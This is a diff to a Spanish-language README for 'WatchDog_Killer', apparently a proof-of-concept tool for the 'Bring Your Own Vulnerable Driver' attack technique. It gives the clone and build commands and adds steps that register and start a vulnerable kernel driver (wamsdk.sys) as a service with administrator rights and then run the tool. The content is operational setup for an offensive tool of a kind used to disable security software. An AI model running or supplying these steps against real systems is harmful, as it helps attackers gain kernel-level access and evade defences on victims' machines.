@@ -51,6 +51,19 @@ Este proyecto sirve como prueba de concepto para la técnica de ataque "Bring Yo
 git clone https://github.com/3xploit666/WatchDog_Killer.git
 cd WatchdogKiller
 cargo build --release
+```
+
+### Configuración del Driver
+Antes de ejecutar la herramienta, debes cargar el driver vulnerable:
+
+```cmd
+# Crear el servicio del driver (como Administrador)
+sc.exe create watchdog_killer binPath="C:\ruta\al\wamsdk.sys" type=kernel
+
+# Iniciar el servicio
+sc.exe start watchdog_killer
+
+# Ejecutar la herramienta
 .\target\release\watchdog_killer.exe
 ```
 
